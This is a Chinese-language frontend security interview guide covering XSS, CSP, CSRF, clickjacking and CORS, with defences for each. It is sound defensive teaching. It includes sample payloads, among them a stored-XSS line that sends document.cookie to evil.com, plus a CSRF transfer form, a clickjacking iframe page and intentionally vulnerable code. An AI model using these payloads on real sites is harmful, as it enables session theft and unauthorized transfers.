## 1. 前端安全全景与威胁模型

**结论：** 前端安全的核心不是「写几个过滤函数」，而是**识别信任边界**：浏览器、用户输入、第三方脚本、网络链路、后端服务，哪些可信、哪些不可信。前端的任何数据都可能被篡改，任何凭证一旦下发到 JS 就可被读取，因此安全必须**分层防御**：传输层、渲染层、会话层、依赖层各自设防。

**资产与威胁：**

| 资产 | 被攻击后的影响 | 主要威胁 |
| --- | --- | --- |
| 用户会话凭证 | 账号被接管 | XSS 窃取、CSRF 借用、Token 泄露 |
| 用户隐私数据 | 数据泄露、合规处罚 | 越权接口、CORS 过宽、日志泄露 |
| 页面内容与操作 | 被篡改、被诱导点击 | XSS、点击劫持、供应链投毒 |
| 支付与交易 | 资金损失 | CSRF、参数篡改、重放 |
| 前端代码与构建产物 | 源码与密钥泄露 | sourcemap、环境变量误打包 |
| 用户浏览器环境 | 被当作攻击跳板 | 开放重定向、恶意第三方脚本 |

**攻击面：**

| 层面 | 入口 | 典型问题 |
| --- | --- | --- |
| 输入 | URL 参数、表单、`postMessage`、文件、剪贴板 | XSS、开放重定向、原型污染 |
| 输出 | `innerHTML`、模板拼接、`dangerouslySetInnerHTML` | DOM XSS |
| 会话 | Cookie、localStorage、URL、请求头 | 凭证泄露、固定会话 |
| 网络 | HTTP 明文、弱 TLS、混合内容 | 中间人、窃听 |
| 依赖 | npm 包、CDN 脚本、iframe 第三方 | 供应链投毒、SRI 缺失 |
| 配置 | CORS、CSP、Cookie 属性、缓存头 | 跨源数据泄露、缓存串源 |

**信任边界：**

```text
用户输入 / 第三方内容  —— 不可信
        │  转义、校验、清洗
浏览器 DOM / 存储      —— 半可信（可被 XSS 改写）
        │  CSP、HttpOnly、SameSite
网络链路               —— 不可信（除非 HTTPS + 正确证书）
        │  TLS、HSTS
后端服务               —— 可信边界内，但仍需鉴权与输入校验
        │  最小权限、参数化查询
数据库 / 内部服务       —— 最高价值目标
```

**四条基本原则：**

1. **永不信任客户端。** 前端校验只为体验，服务端必须重新校验；价格、权限、状态不能由前端决定。
2. **最小权限。** Cookie 只给必要作用域，Token 只给必要 scope，CORS 只给必要源，第三方脚本只给必要能力。
3. **纵深防御。** 转义之外还要 CSP，CSP 之外还要 HttpOnly；单点失效不应导致全线崩溃。
4. **安全默认值。** 默认拒绝、默认转义、默认 `SameSite=Lax`、默认不开 `debug`。

**常见误区：**

| 误区 | 现实 |
| --- | --- |
| 「前端做了校验就安全了」 | 攻击者可以直接调接口，服务端校验不可省 |
| 「用了 HTTPS 就没有安全问题」 | HTTPS 只保护传输，不防 XSS/CSRF/越权 |
| 「React/Vue 自动转义，所以不会 XSS」 | `innerHTML`、`dangerouslySetInnerHTML`、`href="javascript:"` 仍可注入 |
| 「小公司不会被盯上」 | 自动化扫描与供应链攻击不挑目标 |
| 「前端加密能保护密码」 | 前端加密不替代 TLS，也无法阻止重放 |

**面试怎么答：** 先给「信任边界 + 纵深防御」的总纲，再按「输入、输出、会话、网络、依赖、配置」列攻击面，最后落到「前端校验不可信、服务端必须兜底」。能举出 XSS、CSRF、点击劫持、CORS 过宽、供应链五类问题，并说明它们分别属于哪个层面，就足够体系化。

**易错点：**

- 把安全等同于「输入过滤」，忽略输出编码与上下文。
- 认为前端做了鉴权判断就能保护接口；攻击者可以绕过页面直接请求。
- 认为 HTTPS 能防 XSS；它只防窃听与篡改传输。
- 只防 `script` 标签，忽略事件属性、`javascript:` URL、CSS 注入等载体。
- 忽略第三方脚本与构建产物的风险，把它们当成「自己人」。

## 2. XSS 的三种类型（反射型/存储型/DOM 型）

**结论：** XSS 的本质是**不可信数据进入了会被浏览器当作代码执行的上下文**。按注入路径分为反射型（请求参数立即回显）、存储型（恶意内容落库，所有访问者中招）、DOM 型（前端 JS 把不可信数据写入危险 sink，服务端响应本身可能完全正常）。三者的防御重点不同，但共同点是「输出到哪个上下文，就按哪个上下文编码」。

**三种类型对比：**

| 维度 | 反射型 | 存储型 | DOM 型 |
| --- | --- | --- | --- |
| 恶意数据位置 | URL / 请求参数 | 数据库、评论、昵称、文件 | URL、`postMessage`、`localStorage` 等前端来源 |
| 是否经过服务端 | 是，响应中回显 | 是，读取后渲染 | 可能完全不经服务端 |
| 影响范围 | 诱导单个用户点击 | 所有访问该页面的用户 | 取决于 sink 与数据来源 |
| 持久性 | 不持久 | 持久 | 不持久，但可通过链接传播 |
| 典型入口 | 搜索词、错误页、跳转参数 | 评论区、个人主页、工单 | `location.hash`、`innerHTML`、`eval` |
| 服务端能否看到 payload | 能（访问日志） | 能（存储内容） | 可能看不到（片段不发送） |

**反射型示例：**

```js
// 服务端把查询参数直接拼进 HTML（错误示范）
app.get('/search', (req, res) => {
  res.send(`<h1>搜索结果：${req.query.q}</h1>`);
});

// 攻击链接
// https://example.com/search?q=<img src=x onerror=alert(document.cookie)>
```

**存储型示例：**

```js
// 评论写入时未过滤，渲染时也未编码（错误示范）
const comment = await db.comments.create({ content: req.body.content });
res.send(`<div class="comment">${comment.content}</div>`);

// 攻击者在评论中提交
// <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
```

**DOM 型示例：**

```js
// 数据来源是 location.hash，sink 是 innerHTML（错误示范）
const keyword = decodeURIComponent(location.hash.slice(1));
document.querySelector('#result').innerHTML = `你搜索的是：${keyword}`;

// 攻击链接
// https://example.com/#<img src=x onerror=alert(1)>
```

DOM 型的关键是**source 到 sink 的链路**：

| source（不可信来源） | sink（危险写入点） |
| --- | --- |
| `location.href`、`location.hash`、`location.search` | `innerHTML`、`outerHTML`、`insertAdjacentHTML` |
| `document.referrer` | `document.write`、`document.writeln` |
| `window.name` | `eval`、`Function`、`setTimeout(string)` |
| `postMessage` 的 `event.data` | `element.setAttribute('href', ...)`、`src` |
| `localStorage`、IndexedDB | jQuery 的 `.html()`、`.append()` |
| `fetch` 返回的第三方数据 | Vue 的 `v-html`、React 的 `dangerouslySetInnerHTML` |

**几个变体：**

| 变体 | 特点 |
| --- | --- |
| Mutation XSS（mXSS） | 浏览器解析与序列化后的 DOM 结构发生变化，原本「看起来安全」的 HTML 重新变成可执行 |
| Blind XSS | payload 在后台管理页、日志查看器才触发，攻击者当时看不到结果 |
| Self-XSS | 诱导用户自己把恶意代码粘贴进控制台，通常配合社会工程 |
| Universal XSS | 利用浏览器或插件漏洞，绕过同源限制，影响面最大 |

**为什么「过滤 `<script>`」不够：** 浏览器把 HTML 当作代码执行的入口非常多：`<img onerror>`、`<svg onload>`、`<iframe srcdoc>`、`<a href="javascript:">`、`<form action="javascript:">`、CSS 的 `expression`（旧 IE）、`<meta http-equiv="refresh">`。只做黑名单过滤必然漏。

**面试怎么答：** 先给「不可信数据进入可执行上下文」的定义，再用表格区分三型的注入位置与影响范围。重点讲清 DOM 型：服务端响应可能完全正常，问题出在前端 source→sink 的赋值。最后补 mXSS、Blind XSS，说明为什么黑名单过滤不可靠。

**易错点：**

- 认为 DOM 型 XSS 一定经过服务端；它可能只发生在浏览器内。
- 只检查 URL 参数，忽略 `location.hash`（不会发送到服务端，日志里看不到）。
- 认为 `innerHTML` 会执行 `<script>`，因此安全；`<script>` 确实不执行，但 `onerror`、`onload` 会执行。
- 把「用户输入」只理解成表单，忽略 `postMessage`、`document.referrer`、第三方接口返回。
- 认为前端框架自动转义就万无一失，忽略显式渲染原始 HTML 的 API。

## 3. XSS 的防御手段（转义、CSP、HttpOnly、富文本白名单）

**结论：** XSS 防御的核心是**按输出上下文做编码**，而不是过滤输入。输入校验用于拒绝明显非法数据，输出编码用于保证数据在 HTML、属性、URL、JS、CSS 中都被当作数据而非代码；富文本必须走白名单清洗；CSP 与 HttpOnly 是纵深防御，不能替代编码。

**按上下文编码：**

| 输出位置 | 编码规则 | 示例 |
| --- | --- | --- |
| HTML 文本 | `&` `<` `>` `"` `'` 转实体 | `<div>${escapeHtml(x)}</div>` |
| HTML 属性 | 属性值必须加引号，转义引号与实体 | `<div title="${escapeAttr(x)}">` |
| URL 参数 | `encodeURIComponent`，并校验协议 | `href="/search?q=${encodeURIComponent(x)}"` |
| JavaScript 字符串 | 使用 `JSON.stringify` 后嵌入，避免手拼 | `const data = ${JSON.stringify(x)};` |
| CSS | 只允许白名单值，禁止拼接 | `style="color:${safeColor}"` |
| 富文本 HTML | 白名单标签与属性，走 DOMPurify | `DOMPurify.sanitize(html)` |

```js
function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

// 属性值同样要转义，并且必须用引号包起来
const html = `<a href="/user?id=${encodeURIComponent(userId)}" title="${escapeHtml(name)}">${escapeHtml(name)}</a>`;
```

注意顺序：先转义 `&`，再转义其他字符，否则会把已转义的内容二次转义。URL 场景不能只用 HTML 转义，`javascript:` 协议仍需协议白名单。

**富文本白名单：**

```js
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'code', 'pre', 'blockquote'],
  ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'style'],
});

// 外链补 rel，防止 tabnabbing
const safe = clean.replace(/<a\s/gi, '<a rel="noopener noreferrer" ');
```

白名单要遵循「默认拒绝」：只允许业务真正需要的标签与属性，`href` 只允许 `http/https/mailto`，禁止 `javascript:`、`data:`（除非明确需要图片且做了类型限制）。

**框架的自动转义与例外：**

| 框架 | 默认行为 | 危险 API |
| --- | --- | --- |
| React | 文本插值自动转义 | `dangerouslySetInnerHTML`、`href={userInput}` |
| Vue | 插值自动转义 | `v-html`、动态 `:href` |
| Angular | 模板转义 + Sanitizer | `bypassSecurityTrustHtml` |
| 原生 DOM | 无自动转义 | `innerHTML`、`insertAdjacentHTML`、`document.write` |

即使框架自动转义，`href` 与 `src` 仍是常见漏洞点：`<a href="javascript:alert(1)">` 不需要 HTML 注入就能执行。对用户可控的 URL 必须做协议白名单。

**CSP 与 HttpOnly 的定位：**

| 手段 | 能防什么 | 不能防什么 |
| --- | --- | --- |
| 输出编码 | 绝大部分 XSS | 编码遗漏、业务本身需要渲染 HTML |
| CSP | 内联脚本、未授权外链脚本、部分注入 | 同源内的 DOM XSS、已授权的 CDN 被投毒 |
| `HttpOnly` | JS 读取 Cookie | XSS 发起同站请求、页面内容篡改 |
| `Trusted Types` | 危险 sink 接收字符串 | 未改造的旧代码、服务端模板注入 |
| SRI | CDN 资源被篡改 | 同源脚本、动态注入 |

**Trusted Types：**

```js
// 需要 CSP 配合：require-trusted-types-for 'script'
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
});

el.innerHTML = policy.createHTML(userInput);
```

开启后，`innerHTML`、`eval`、`script.src` 等 sink 只接受 `TrustedHTML`/`TrustedScript`，直接把字符串写入会抛错。它是从「靠自觉编码」转向「浏览器强制约束」的手段，但改造成本高。

**防御清单：**

```text
1. 所有输出按上下文编码，禁止字符串拼接 HTML
2. 富文本走白名单清洗（DOMPurify），并限制 URL 协议
3. 用户可控 URL 做协议白名单，禁止 javascript:/data:
4. 设置 CSP，脚本使用 nonce 或 hash，禁用 unsafe-inline
5. 会话 Cookie 加 HttpOnly、Secure、SameSite
6. 高危操作要求二次确认或重新认证
7. 第三方脚本使用 SRI，限制其权限
8. 开启 Trusted Types 或框架的 Sanitizer
```

**面试怎么答：** 按「输入校验是辅助、输出编码是核心、富文本白名单、CSP 与 HttpOnly 是纵深」四层回答。重点说明「上下文决定编码方式」，并举 `href="javascript:"` 这种不需要 HTML 注入的例子。最后补框架自动转义的例外与 Trusted Types 的强制约束思路。

**易错点：**

- 只做输入过滤不做输出编码；同一份数据在 HTML、属性、JS 中需要不同处理。
- 用 `escapeHtml` 处理 URL，忽略 `javascript:` 协议仍然可执行。
- 富文本用黑名单删 `script`，漏掉 `onerror`、`srcdoc`、`style`。
- 认为 `HttpOnly` 能防 XSS；它只保护 Cookie 不被读取。
- 认为 CSP 加上就万事大吉；同源 JSONP、开放重定向、白名单 CDN 都可能被绕过。
- 给外链加 `target="_blank"` 却不加 `rel="noopener"`，留下 tabnabbing 风险。

## 4. CSP 详解（指令、nonce/hash、report-only、CSP 绕过）

**结论：** CSP（Content Security Policy）是浏览器执行的**资源加载白名单**：通过响应头声明脚本、样式、图片、连接、框架等只能从哪些来源加载，从而缩小 XSS 的利用面。它不是 XSS 的根治手段，而是「即使注入了脚本，也让它跑不起来」的纵深防御。配置的核心是**默认拒绝 + 精确白名单 + nonce/hash**。

**一个较严格的配置：**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' 'strict-dynamic' https:;
  style-src 'self' 'nonce-abc123';
  img-src 'self' data: https://cdn.example.com;
  font-src 'self' https://cdn.example.com;
  connect-src 'self' https://api.example.com wss://api.example.com;
  frame-src https://pay.example.com;
  frame-ancestors 'none';
  base-uri 'none';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests;
  report-to csp-endpoint;
```

**常用指令：**

| 指令 | 控制范围 | 建议 |
| --- | --- | --- |
| `default-src` | 其他指令的兜底 | 设为 `'self'`，再逐项放宽 |
| `script-src` | JS 来源、内联脚本 | 用 nonce/hash，禁用 `unsafe-inline` |
| `style-src` | CSS 来源、内联样式 | 尽量 nonce，`unsafe-inline` 风险较低但可被滥用 |
| `img-src` | 图片 | 允许 `data:` 时注意 SVG 可携带脚本 |
| `connect-src` | `fetch`、XHR、WebSocket | 精确到 API 域名，含 `wss:` |
| `frame-src` | iframe 来源 | 只允许可信嵌入方 |
| `frame-ancestors` | 谁可以嵌入当前页 | 防点击劫持，替代 `X-Frame-Options` |
| `base-uri` | `<base>` 标签 | 设为 `'none'`，防相对路径劫持 |
| `form-action` | 表单提交目标 | 设为 `'self'`，防表单外发 |
| `object-src` | `<object>`、`<embed>` | 设为 `'none'` |
| `upgrade-insecure-requests` | 自动升级 http 资源 | 混合内容场景建议开启 |
| `sandbox` | 对页面施加 iframe sandbox 限制 | 谨慎使用，可能破坏功能 |

**nonce 与 hash：**

```html
<!-- 服务端每次请求生成随机 nonce，并同时写入 CSP 头 -->
<script nonce="abc123">
  window.__INITIAL_STATE__ = {"userId": 1};
</script>
```

```http
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

| 方式 | 适用 | 注意 |
| --- | --- | --- |
| `nonce-xxx` | 服务端渲染的内联脚本 | 每次请求必须随机，不能复用 |
| `sha256-xxx` | 静态内联脚本、第三方固定脚本 | 内容一变 hash 就失效 |
| `strict-dynamic` | 允许受信脚本动态加载其他脚本 | 会忽略 `self` 与白名单，需确保根脚本可信 |

`strict-dynamic` 的设计是「信任链传递」：带 nonce 的脚本创建的 `<script>` 也被信任。它解决了动态加载的问题，但也意味着**根脚本一旦被攻破，后续加载全部放行**。

**Report-Only 与上报：**

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

```js
// 上报端点接收 JSON 报告
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.warn('CSP 拦截', req.body['csp-report']);
  res.status(204).end();
});
```

`Report-Only` 只记录不拦截，适合上线前观察存量违规；确认无误后再切换为强制执行。`report-to` 是新版分组上报机制，需要配合 `Reporting-Endpoints` 头。

**常见绕过手法（面试加分项）：**

| 绕过 | 原理 | 防御 |
| --- | --- | --- |
| 白名单中的 JSONP 端点 | 攻击者用 JSONP 回调把数据当脚本执行 | 不要把可控 JSONP 域名加入 `script-src` |
| 开放重定向 | 白名单域名上的跳转可被利用加载任意脚本 | 修复开放重定向，使用 `strict-dynamic` |
| CDN 上的可控文件 | 白名单 CDN 托管了用户上传的 JS | 不把整站 CDN 加入白名单，使用 SRI |
| `base-uri` 未限制 | 注入 `<base>` 改变相对路径，劫持脚本加载 | `base-uri 'none'` |
| `unsafe-inline` | 内联脚本直接执行 | 用 nonce/hash 替代 |
| `script-src 'self'` + 上传 | 同源上传的 HTML/JS 被当作脚本 | 上传目录单独域，禁止执行 |
| DOM clobbering | 用 HTML 元素覆盖全局变量，绕过脚本逻辑 | 代码避免依赖全局 id 变量 |
| 服务端模板注入 | CSP 无法约束服务端拼出的 HTML | 服务端同样要编码 |

**部署方式：**

```nginx
# Nginx 统一加 CSP，注意 nonce 需要由应用动态生成
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'" always;
```

nonce 必须每次请求随机且不可预测，不能把固定值写进 Nginx 配置；通常由后端渲染时生成，再通过模板与响应头同时下发。

**面试怎么答：** 先定位「CSP 是资源白名单，不是 XSS 根治」，再讲 `default-src` 兜底与常用指令，重点说清 nonce/hash 与 `strict-dynamic` 的信任链。最后补 `Report-Only` 的灰度方式与常见绕过（JSONP、开放重定向、CDN 上传、`base-uri`），体现「CSP 也会被绕过」。

**易错点：**

- 配了 `default-src 'self'` 却忘了 `script-src` 里的 `unsafe-inline`，等于没防内联脚本。
- nonce 固定不变或可预测，攻击者可以直接复用。
- 把整个 CDN 域名加入白名单，CDN 上任何用户内容都能当脚本加载。
- 忘记 `frame-ancestors`，以为 CSP 能防点击劫持。
- 只上 `Report-Only` 就以为已经防护，实际没有拦截。
- 认为 CSP 能防服务端模板注入；它只能约束浏览器加载行为。

## 5. CSRF 的原理与防御（Token、SameSite、Referer、双重 Cookie）

**结论：** CSRF 的本质是**浏览器自动携带目标站点的凭证**，攻击者不需要读取响应，只要诱导用户发出一个带 Cookie 的请求就能完成操作。防御的核心是**让攻击者无法伪造一个「服务端认可」的请求**：CSRF Token、SameSite Cookie、Origin/Referer 校验、双重 Cookie、自定义请求头，任选组合形成纵深。

**攻击流程：**

```text
1. 用户登录 bank.com，浏览器持有 session Cookie
2. 用户访问 evil.com
3. evil.com 页面自动提交表单：
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. 浏览器向 bank.com 发送 POST，并自动带上 session Cookie
5. bank.com 认为是用户本人操作，转账成功
```

关键点：攻击者**看不到响应**（受同源策略限制），但请求已经产生副作用。因此 CSRF 针对的是「写操作」，GET 请求不应有副作用。

**成立条件：**

| 条件 | 说明 |
| --- | --- |
| 有会话凭证 | Cookie、HTTP Basic、IP 白名单等自动携带的凭证 |
| 参数可预测 | 攻击者知道接口地址与参数格式 |
| 服务端不校验来源 | 只靠 Cookie 判断身份 |
| 请求可被跨站发起 | 表单、图片、`<script>`、`fetch`（简单请求）均可 |

**防御手段对比：**

| 手段 | 原理 | 优点 | 局限 |
| --- | --- | --- | --- |
| CSRF Token | 服务端生成随机 token，请求必须携带并校验 | 最可靠，覆盖所有请求 | 需要会话存储与表单/请求头集成 |
| SameSite Cookie | 浏览器限制跨站发送 Cookie | 零代码，效果好 | 兼容性、跨站登录场景受限 |
| Origin / Referer 校验 | 校验请求来源 | 实现简单 | `Referer` 可能被裁剪或缺失 |
| 双重 Cookie | 随机值同时放 Cookie 与请求参数，服务端比对 | 无需服务端存储 | 子域可写 Cookie 时可能被绕过 |
| 自定义请求头 | 跨站表单无法设置自定义头，且触发预检 | 简单有效 | 需要前端统一加头，依赖 CORS |
| 二次确认 / 验证码 | 高危操作增加人工步骤 | 兜底 | 影响体验 |

**同步 Token（最常用）：**

```js
// 服务端：登录后生成 token，绑定会话
app.use(session({ secret: process.env.SESSION_SECRET, cookie: { httpOnly: true, sameSite: 'lax', secure: true } }));

app.get('/form', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.render('form', { csrfToken: token });
});

app.post('/transfer', (req, res) => {
  const sent = req.body.csrfToken || req.get('X-CSRF-Token');
  if (!sent || sent !== req.session.csrfToken) {
    return res.status(403).json({ error: 'invalid csrf token' });
  }
  // 执行转账
});
```

```html
<input type="hidden" name="csrfToken" value="{{ csrfToken }}">
```

Token 必须是**随机会话绑定**的值，不能是固定常量；校验要使用**时间安全比较**，避免时序侧信道。

**双重 Cookie（无状态方案）：**

```js
// 服务端下发随机值到 Cookie（非 HttpOnly，前端需要读取）
res.cookie('csrf', crypto.randomBytes(32).toString('hex'), {
  sameSite: 'lax',
  secure: true,
  path: '/',
});

// 前端读取后放入请求头
const csrf = document.cookie.match(/csrf=([^;]+)/)?.[1];
fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: { 'X-CSRF-Token': csrf, 'Content-Type': 'application/json' },
  body: JSON.stringify(payload),
});

// 服务端比对 Cookie 与请求头是否一致
```

双重 Cookie 的假设是「攻击者无法读取或写入目标域的 Cookie」。如果存在子域 XSS 或子域可设置父域 Cookie，攻击者可以覆盖 Cookie 值，方案失效。更稳的做法是**签名双重 Cookie**：服务端对随机值加签名，校验签名而不是只比对相等。

**SameSite 的正确用法：**

| 场景 | 建议 |
| --- | --- |
| 普通站内应用 | `SameSite=Lax`，配合 Token |
| 需要跨站嵌入或跨站登录 | `SameSite=None; Secure`，必须加 Token |
| 高危操作 | `Strict` 或二次认证 |
| 兼容旧浏览器 | 同时保留 Token，不依赖 SameSite 单点 |

`SameSite` 是浏览器层防线，不能覆盖所有客户端（旧浏览器、非浏览器客户端），所以服务端仍应校验 Token。

**Origin / Referer 校验：**

```js
function checkOrigin(req, res, next) {
  const origin = req.get('Origin');
  const referer = req.get('Referer');
  const allowed = new Set(['https://app.example.com']);

  if (origin && !allowed.has(origin)) {
    return res.status(403).end();
  }
  if (!origin && referer) {
    try {
      if (!allowed.has(new URL(referer).origin)) return res.status(403).end();
    } catch {
      return res.status(403).end();
    }
  }
  next();
}
```

注意：`Origin` 在部分 GET/导航请求中可能缺失；`Referer` 可被 `Referrer-Policy` 裁剪。校验逻辑应「取不到就拒绝」或「对高危操作要求 Token」，不要因为缺失就放行。

**特殊变体：**

| 变体 | 说明 |
| --- | --- |
| 登录 CSRF | 诱导用户登录攻击者账号，之后用户的操作都发生在攻击者账号下 |
| JSON CSRF | 用 `text/plain` 表单绕过 `application/json` 限制，服务端若宽容解析就会中招 |
| 跨站 WebSocket 劫持 | 利用 Cookie 自动携带建立 WS 连接，服务端需校验 `Origin` |
| CORS 配置过宽 | 反射 Origin + 凭证，攻击者可读响应，CSRF 与数据泄露叠加 |

**面试怎么答：** 先讲清「浏览器自动带 Cookie + 攻击者不需要读响应」这个本质，再列防御手段并比较优缺点。重点推荐「SameSite=Lax + CSRF Token + Origin 校验」的组合，说明 Token 要会话绑定、双重 Cookie 的失效条件、GET 不应有副作用。最后补登录 CSRF 与 JSON CSRF。

**易错点：**

- 认为 CSRF 需要攻击者拿到 Cookie；实际只需要浏览器自动携带。
- 只靠 `SameSite` 不做 Token，忽略旧客户端与跨站场景。
- Token 放在 URL 或日志里，造成泄露。
- 双重 Cookie 在子域可写父域 Cookie 的场景下失效。
- 校验 `Referer` 时用 `includes` 匹配，被相似域名绕过。
- 认为 `Content-Type: application/json` 就安全；服务端宽容解析仍可能被 JSON CSRF。

## 6. 点击劫持与防御（X-Frame-Options、frame-ancestors）

**结论：** 点击劫持（Clickjacking）是**视觉欺骗**：攻击者用透明 iframe 覆盖目标页面，诱导用户点击自己看不到的按钮。它不依赖 XSS，也不需要读取目标页面，只要目标页面允许被嵌入就能实施。防御的核心是**禁止或限制被第三方页面嵌入**，首选 CSP `frame-ancestors`，兼容场景叠加 `X-Frame-Options`。

**攻击示例：**

```html
<!-- evil.com：透明的 iframe 覆盖在诱饵按钮上 -->
<style>
  iframe {
    position: fixed;
    inset: 0;
    width: 100vw;
    height: 100vh;
    opacity: 0.0001;
    z-index: 9999;
    border: 0;
  }
  .bait {
    position: fixed;
    top: 320px;
    left: 200px;
    z-index: 1;
  }
</style>
<button class="bait">领取优惠券</button>
<iframe src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>
```

用户以为点的是「领取优惠券」，实际点到了 iframe 里的「确认转账」。更隐蔽的变体还有 `cursorjacking`（伪造鼠标位置）、`likejacking`（诱导点赞）、拖拽劫持（诱导把内容拖入 iframe）。

**防御手段对比：**

| 手段 | 取值 | 生效范围 | 说明 |
| --- | --- | --- | --- |
| `X-Frame-Options` | `DENY` | 禁止任何嵌入 | 最严格 |
| `X-Frame-Options` | `SAMEORIGIN` | 仅同源可嵌入 | 常用 |
| `X-Frame-Options` | `ALLOW-FROM uri` | 指定源 | 已废弃，兼容性差 |
| CSP `frame-ancestors` | `'none'` | 禁止任何嵌入 | 现代标准，优先级更高 |
| CSP `frame-ancestors` | `'self'` | 仅同源 | 等价于 SAMEORIGIN |
| CSP `frame-ancestors` | `https://a.com` | 指定源 | 支持多个源与通配 |
| JS framebusting | `top !== self` 时跳转 | 页面内 | 可被 sandbox 绕过，不可靠 |

**推荐配置：**

```nginx
# 同时下发，现代浏览器优先使用 CSP
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
```

```js
// Express
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
  next();
});
```

**为什么 framebusting 不可靠：**

```js
// 常见的旧方案，容易被绕过
if (window.top !== window.self) {
  window.top.location = window.self.location;
}
```

攻击者可以用 `sandbox="allow-scripts"` 让脚本运行但禁止顶层导航，或用 `onbeforeunload` 阻止跳转，甚至用双重 iframe 让 `top` 判断失效。服务端响应头才是可靠防线。

**容易被忽略的点：**

| 场景 | 风险 |
| --- | --- |
| 只给首页加 XFO，详情页没加 | 攻击者直接嵌入详情页 |
| 使用 `ALLOW-FROM` | 主流浏览器已不支持 |
| 页面允许被嵌入以支持「预览」 | 预览域可能被攻击者控制 |
| 弹窗/第三方登录页 | 可能被嵌入做凭证钓鱼 |
| iframe 内再嵌 iframe | `frame-ancestors` 只约束直接祖先链，需逐层配置 |

**面试怎么答：** 先用「透明 iframe + 视觉欺骗」讲清原理，强调它不需要 XSS、也不需要读响应。再对比 `X-Frame-Options` 与 `frame-ancestors`，说明后者是标准且优先级更高、支持多源。最后点出 framebusting 可被 sandbox 绕过，防御必须在响应头。

**易错点：**

- 认为点击劫持需要注入脚本；它只需要页面可被嵌入。
- 只配 `X-Frame-Options`，忽略 `frame-ancestors` 的多源能力。
- 使用已废弃的 `ALLOW-FROM`，在 Chrome 中无效。
- 只保护首页，忽略真正有敏感操作的子页面。
- 依赖 JS framebusting，忽略 sandbox 可以阻止顶层导航。

## 7. CORS 的安全风险与常见错误配置

**结论：** CORS 是**浏览器侧的读取授权**，不是服务端鉴权。最常见的危险配置是「反射任意 `Origin` + 允许凭证」，这等于让任何站点都能带着用户 Cookie 读取接口数据；其次是信任 `null` 源、用正则宽松匹配子域、把内网接口暴露给公网源。正确做法是**精确白名单 + 最小方法/头 + `Vary: Origin`**，并且永远不要用 CORS 代替身份认证。

**危险配置与后果：**

| 配置 | 后果 | 正确做法 |
| --- | --- | --- |
| `Access-Control-Allow-Origin: <请求的 Origin>` 无白名单 | 任意站点可读带凭证的响应 | 精确源白名单 |
| `Allow-Origin: *` + `Allow-Credentials: true` | 浏览器拒绝，开发者改用反射，反而更危险 | 具体源 + 凭证 |
| 信任 `Origin: null` | sandbox iframe、`data:` 页面可读取数据 | 不把 `null` 加入白名单 |
| 正则 `/example\.com/` 未锚定 | `evil-example.com`、`example.com.evil.com` 绕过 | 完整源精确匹配 |
| 允许 `http://` 源 | 中间人可伪造来源 | 只允许 HTTPS |
| 未设置 `Vary: Origin` | CDN 把 A 站响应缓存给 B 站 | 加 `Vary: Origin` |
| 反射所有请求头 | 扩大攻击面 | 只允许业务需要的头 |
| 预检缓存过长 | 配置变更后旧策略仍生效 | 合理设置 `Max-Age` |

**漏洞示例与修复：**

```js
// 危险：反射任意 Origin，并允许凭证
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

```js
// 安全：精确白名单 + Vary + 最小权限
const ALLOWED = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,X-CSRF-Token');
    res.setHeader('Access-Control-Max-Age', '300');
    return res.status(204).end();
  }
  next();
});
```

**`null` 源为什么危险：** 沙箱 iframe、`data:` URL、`file:` 页面、某些重定向场景会发送 `Origin: null`。如果服务端把 `null` 加入白名单，攻击者可以把恶意页面放进 sandbox iframe，从而获得带凭证的读取权限。正确做法是直接拒绝 `null`。

**子域信任的陷阱：**

```js
// 危险：后缀匹配
if (origin.endsWith('example.com')) allow();

// 攻击者可用 https://example.com.evil.com 绕过
```

应解析 URL 后比较 `protocol` 与 `hostname`，并维护精确列表；如果确实要信任所有子域，需评估子域被接管的风险（子域 XSS、废弃子域、云服务 CNAME 劫持）。

**CORS 与 CSRF 的关系：** CORS 配得过宽会让攻击者**读到响应**，而 CSRF 只需要**发出请求**。两者叠加时，攻击者既能发起操作又能读取数据。反过来，严格的 CORS 不能防 CSRF，因为表单类请求不需要 CORS 授权也能发出。

